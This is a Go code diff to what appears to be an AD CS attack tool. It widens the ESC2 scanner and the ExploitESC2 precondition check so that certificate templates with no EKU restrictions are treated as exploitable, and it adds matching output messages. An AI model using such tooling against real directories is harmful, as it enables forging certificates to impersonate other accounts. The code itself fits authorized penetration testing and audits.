@@ -36,8 +36,9 @@ func ScanESC2(cfg *ADCSConfig) ([]ESC2Finding, error) {
 
 	var findings []ESC2Finding
 	for _, tmpl := range templates {
-		// Check for Any Purpose EKU
+		// Check for Any Purpose EKU or empty EKU list (no restrictions = any purpose)
 		hasAnyPurpose := false
+		noEKUs := len(tmpl.EKUs) == 0
 		for _, eku := range tmpl.EKUs {
 			if eku == ekuAnyPurpose {
 				hasAnyPurpose = true
@@ -45,13 +46,17 @@ func ScanESC2(cfg *ADCSConfig) ([]ESC2Finding, error) {
 			}
 		}
 
-		if hasAnyPurpose && tmpl.EnrolleeSuppliesSubject {
+		if (hasAnyPurpose || noEKUs) && tmpl.EnrolleeSuppliesSubject {
 			finding := ESC2Finding{
 				TemplateName: tmpl.Name,
 				EKUs:         tmpl.EKUs,
 			}
 			findings = append(findings, finding)
-			fmt.Printf("[!] ESC2: Template %q has Any Purpose EKU + enrollee supplies subject\n", tmpl.Name)
+			if noEKUs {
+				fmt.Printf("[!] ESC2: Template %q has NO EKU restrictions (implicit any purpose) + enrollee supplies subject\n", tmpl.Name)
+			} else {
+				fmt.Printf("[!] ESC2: Template %q has Any Purpose EKU + enrollee supplies subject\n", tmpl.Name)
+			}
 			fmt.Printf("[*]   EKUs: %v\n", tmpl.EKUs)
 			fmt.Printf("[*]   Manager approval: %v\n", tmpl.RequiresManagerApproval)
 		}
@@ -91,17 +96,18 @@ func ExploitESC2(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 		return nil, nil, fmt.Errorf("template %q not found", templateName)
 	}
 
-	// Verify ESC2 conditions: Any Purpose EKU + enrollee supplies subject
+	// Verify ESC2 conditions: Any Purpose EKU (or no EKU restrictions) + enrollee supplies subject
 	hasAnyPurpose := false
+	noEKUs := len(vulnTemplate.EKUs) == 0
 	for _, eku := range vulnTemplate.EKUs {
 		if eku == ekuAnyPurpose {
 			hasAnyPurpose = true
 			break
 		}
 	}
-	if !hasAnyPurpose || !vulnTemplate.EnrolleeSuppliesSubject {
-		return nil, nil, fmt.Errorf("template %q is not ESC2 vulnerable (anyPurpose=%v, enrolleeSuppliesSubject=%v)",
-			templateName, hasAnyPurpose, vulnTemplate.EnrolleeSuppliesSubject)
+	if !(hasAnyPurpose || noEKUs) || !vulnTemplate.EnrolleeSuppliesSubject {
+		return nil, nil, fmt.Errorf("template %q is not ESC2 vulnerable (anyPurpose=%v, noEKUs=%v, enrolleeSuppliesSubject=%v)",
+			templateName, hasAnyPurpose, noEKUs, vulnTemplate.EnrolleeSuppliesSubject)
 	}
 
 	fmt.Printf("[+] Template %q confirmed ESC2 vulnerable\n", templateName)
